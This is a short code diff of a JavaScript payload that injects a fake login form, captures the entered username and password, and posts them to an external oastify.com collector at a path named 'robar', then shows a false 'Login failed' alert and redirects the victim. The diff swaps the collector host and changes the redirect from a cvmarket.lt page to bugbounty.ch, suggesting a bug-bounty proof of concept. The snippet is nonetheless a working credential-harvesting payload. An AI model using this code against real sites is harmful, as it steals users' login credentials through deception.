@@ -1,6 +1,6 @@
 var form = document.createElement('form');
 form.method = 'POST';
-form.action = 'https://n2qsloj989nbujlft51o2dg5awgp4fs4.oastify.com/robar';
+form.action = 'https://xef2xyvjkjzl6txp5fdyensfm6s0gq4f.oastify.com/robar';
 
 var inputUser = document.createElement('input');
 inputUser.name = 'username';
@@ -29,5 +29,5 @@ form.addEventListener('submit', function(e) {
     var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
     xhr.send(data);
     alert('Login failed. Please try again.');
-    window.location.href = 'https://www.cvmarket.lt/members/cvs-list';
+    window.location.href = 'https://www.bugbounty.ch/';
 });
